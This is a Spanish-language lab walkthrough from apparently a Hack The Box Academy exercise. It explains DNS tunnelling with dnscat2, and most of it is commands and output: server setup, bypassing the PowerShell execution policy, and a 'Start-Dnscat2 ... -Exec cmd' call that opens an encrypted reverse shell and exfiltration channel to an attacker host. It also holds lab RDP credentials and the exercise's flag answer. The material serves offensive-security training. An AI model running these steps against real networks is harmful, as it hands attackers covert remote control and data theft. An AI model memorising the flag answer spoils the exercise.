Dnscat2 es una herramienta que tuneliza datos usando el protocolo DNS: en lugar de consultas legítimas, encapsula información dentro de registros TXT y establece un canal cifrado de mando y control entre un cliente y un servidor externo. 
Esto la hace muy sigilosa en entornos corporativos, porque el tráfico DNS suele permitirse y puede eludir inspecciones que se centran en HTTPS u otros protocolos. En el ejemplo de prueba, el servidor dnscat2 se ejecuta en la máquina atacante y el cliente en un equipo Windows de la red, permitiendo la exfiltración de datos mediante resoluciones hacia un DNS externo.

## Instalando Dnscat2
```shell-session
Polika4RM@htb[/htb]$ git clone https://github.com/iagox86/dnscat2.git

cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

## Inicializando Dnscat2
Inicializamos el servidor dns2cat con:

```shell-session
Polika4RM@htb[/htb/dnscat2/server]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

(el parámetro "host" tendrá que tener la dirección IP de la máquinta atacante, que es la misma que ejecuta el comando anterior).

Tras ejecutar el servidor, este nos proporcionará la clave secreta, que deberemos proporcionar a nuestro cliente dnscat2 en el host Windows para que pueda autenticar y cifrar los datos enviados a nuestro servidor dnscat2 externo. Podemos usar el cliente con el proyecto dnscat2 o usar dnscat2-powershell, un cliente basado en PowerShell compatible con dnscat2 que podemos ejecutar desde destinos Windows para establecer un túnel con nuestro servidor dnscat2. Podemos clonar el proyecto que contiene el archivo del cliente en nuestro host de ataque y luego transferirlo al destino.

```
New window created: 0
dnscat2> New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 10.10.14.18:53
[domains = inlanefreight.local]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.
```

Importante, de la salida anterior:   *./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21*

--- 

## Clonando y transfieriendo dnscat2-powershell a la 2a máquina
```shell-session
Polika4RM@htb[/htb]$ git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

Una vez descarguemos y compartamos el archivo "dnscat2.ps1" a la máquina windows con la que queremos tunelizar el tráfico, ejecutaremos en su terminal powershell:
```powershell-session
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
Import-Module .\dnscat2.ps1
```

Tras importar dnscat2.ps1, podemos usarlo para establecer un túnel con el servidor que se ejecuta en nuestro host de ataque. Podemos enviar una sesión de shell CMD a nuestro servidor.
```powershell-session
PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```

Debemos usar el secreto precompartido (-PreSharedSecret) generado en el servidor para garantizar que nuestra sesión se establezca y se cifre. Si todos los pasos se completan correctamente, veremos una sesión establecida con nuestro servidor.


#### Listando opciones de dnscat2

Podemos usar dnscat2 para interactuar con sesiones y avanzar en un entorno objetivo en las interacciones. No cubriremos todas las posibilidades de dnscat2 en este módulo, pero se recomienda practicar con él e incluso encontrar formas creativas de usarlo en una interacción. Interactuemos con nuestra sesión establecida y la incorporemos en un shell.

```shell-session
dnscat2> ?

Here is a list of commands (use -h on any of them for additional help):
* echo
* help
* kill
* quit
* set
* start
* stop
* tunnels
* unset
* window
* windows
```

## Interactuando con la sesión establecida
``
``
```shell-session
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a console session!

That means that anything you type will be sent as-is to the
client, and anything they type will be displayed as-is on the
screen! If the client is executing a command and you don't
see a prompt, try typing 'pwd' or something!

To go back, type ctrl-z.

Microsoft Windows [Version 10.0.18363.1801]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
exec (OFFICEMANAGER) 1>
```

---
**Target: 10.129.133.101
RDP to  with user "htb-student" and password "HTB_@cademy_stdnt!"**
**1. Using the concepts taught in this section, connect to the target and establish a DNS Tunnel that provides a shell session. Submit the contents of C:\Users\htb-student\Documents\flag.txt as the answer.**

En mi máquina atacante, preparo el archivo dnscat2 con:
```shell-session
Polika4RM@htb[/htb]$ git clone https://github.com/iagox86/dnscat2.git

cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

Lo ejecuto desde la carpeta /dnscat2/server:
```
sudo ruby dnscat2.rb --dns host=10.10.15.95 ,port=53,domain=inlanefreight.local --no-cache
```


Y me devuelve tal secret: 
```
  ./dnscat --dns server=x.x.x.x,port=53 --secret=57f5c4615e94c4643822079b65083f94
```

Desde otra terminal de la máquina atacante, me descargo el cliente para la máquina windows:

```
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

Y lo comparto por http con el comando:
```
┌─[eu-academy-3]─[10.10.15.95]─[htb-ac-1876550@htb-kbrgiqortk]─[~/dnscat2-powershell]
└──╼ [★]$ python3 -m http.server 8080

```

Me conecto por RDP a la sesión windows con:
```
xfreerdp /u:htb-student /p:HTB_@cademy_stdnt! /v:10.129.133.101
```

Entro a firefox, en:
```
http://10.10.15.95:8080
```

Y me descargo el archivo *"dnscat2.ps1"*.

Me ubico con la poweshell en el directorio donde lo he descargado y ejecuto:
```
PS C:\Users\htb-student\Downloads> Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
>> Import-Module .\dnscat2.ps1
PS C:\Users\htb-student\Downloads>
```
y ejecuto desde la misma poweshell:

```
PS C:\Users\htb-student\Downloads> Start-Dnscat2 -DNSserver 10.10.15.95 -Domain inlanefreight.local -PreSharedSecret 57f5c4615e94c4643822079b65083f94 -Exec cmd 
```

Finalmente, navego a la carpeta de la flag: C:\Users\htb-student\Documents\flag.txt
Y encuentro la respuesta: AC@tinth3Tunnel



